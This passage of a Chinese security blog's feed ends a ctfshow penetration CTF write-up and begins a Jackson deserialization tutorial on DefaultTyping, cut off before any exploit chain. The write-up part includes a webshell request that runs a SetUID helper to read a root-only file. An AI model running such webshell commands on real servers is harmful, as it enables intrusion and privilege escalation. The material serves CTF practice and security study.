class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>java%20-Djava.library.path<span class="token operator">=</span>/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 &#x2F;root&#x2F;message.txt 的内容</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113183415373.png" alt="image-20250113183415373"></p><p>flag：<code>ctfshow&#123;http://8.11.9.2&#125;</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250114003547864.png" alt="image-20250114003547864"></p><p>End</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;马上就要期末考但还是来打了，给3-1困了好几天，还好最后没挂科（&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh&quot;&gt;https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Jackson反序列化</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-12-24T03:44:13.000Z</published>
    <updated>2024-12-24T16:42:16.821Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学期初爽学一次Java，学期末再爽学一次Java😋</p><p>参考：</p><p><a href="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8</a></p><p><a href="https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/</a></p><p><a href="https://zer0peach.github.io/2023/09/27/Jackson/">https://zer0peach.github.io/2023/09/27/Jackson/</a></p><span id="more"></span><hr><h1 id="Jackson基本使用"><a href="#Jackson基本使用" class="headerlink" title="Jackson基本使用"></a>Jackson基本使用</h1><p>Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。</p><p>由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。</p><p>pom.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-annotations<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>定义一个 Person 类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着编写 Jackson 的序列化与反序列化代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224121027834.png" alt="image-20241224121027834"></p><p>那么这里序列化的方法为<code>ObjectMapper.writeValueAsString</code>，反序列化的方法为<code>ObjectMapper.readValue</code></p><hr><h2 id="多态问题"><a href="#多态问题" class="headerlink" title="多态问题"></a>多态问题</h2><p>Java 多态指同一个接口使用不同的实例而执行不同的操作</p><p>那么对于反序列化来说就会有一个问题，对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例？</p><p>Jackson 实现了 <code>JacksonPolymorphicDeserialization</code> 机制来解决这个问题：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如 Object、接口或抽象类，则可以在 JSON 字符串中指定其具体类型，Jackson 将生成具体类型的实例</p><p>具体的操作：启用 <code>DefaultTyping</code> 和 <code>@JsonTypeInfo</code> 注解</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>在 ObjectMapper 中有详细介绍</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224123043497.png" alt="image-20241224123043497"></p><p>实际上四个选项是依次扩大作用范围的：</p><table><thead><tr><th>DefaultTyping类型</th><th>描述说明</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>属性的类型为Object</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>属性的类型为Object、Interface、AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td>NON_FINAL</td><td>所有除了声明为final之外的属性</td></tr></tbody></table><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><blockquote><p>当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）</p></blockquote><p>添加一个 Hacker 类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hacker</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> skill <span class="token operator">=</span> <span class="token string">"havefun"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改 Person 类，添加 Object 类型属性：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建 JAVA_LANG_OBJECTTest.java，添加 <code>enableDefaultTyping()</code> 并设置为 <code>JAVA_LANG_OBJECT</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JAVA_LANG_OBJECTTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置JAVA_LANG_OBJECT  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">JAVA_LANG_OBJECT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224124150808.png" alt="image-20241224124150808"></p><p>无 DefaultTyping 的情况是：</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224124357516.png" alt="image-20241224124357516"></p><p>对比可以看出来，通过 enableDefaultTyping 设置 JAVA_LANG_OBJECT 后，会多输出 Hacker 类名，且在输出的 Object 属性时直接输出的是 Hacker 类对象</p><p>也就是说对 Object 对象进行了序列化和反序列化，并且明确规定类名</p><hr><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><blockquote><p>enableDefaultTyping  无参数时的默认选项。除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化。</p></blockquote><p>整一个 Sex 接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后实现它</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改 Person 类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化和反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OBJECT_AND_NON_CONCRETE_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置OBJECT_AND_NON_CONCRETE  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">OBJECT_AND_NON_CONCRETE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 或直接无参调用，输出一样  </span>        <span class="token comment">//mapper.enableDefaultTyping();  </span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：可以看到该 Interface 类被序列化和反序列化</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>Person.age=<span class="token number">6</span><span class="token punctuation">,</span> Person.name=0w0<span class="token punctuation">,</span> Hacker@42dafa95<span class="token punctuation">,</span> MySex@6500df86<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><blockquote><p>除了前面提到的特征外，还支持 Array 类型</p></blockquote><p>于是给 Object 以 Hacker 类型数组：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NON_CONCRETE_AND_ARRAYS_Test</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>          <span class="token class-name">Hacker</span><span class="token punctuation">[</span><span class="token punctuation">]</span> hackers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          hackers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          hackers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>object <span class="token operator">=</span> hackers<span class="token punctuation">;</span>          p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 设置NON_CONCRETE_AND_ARRAYS  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span 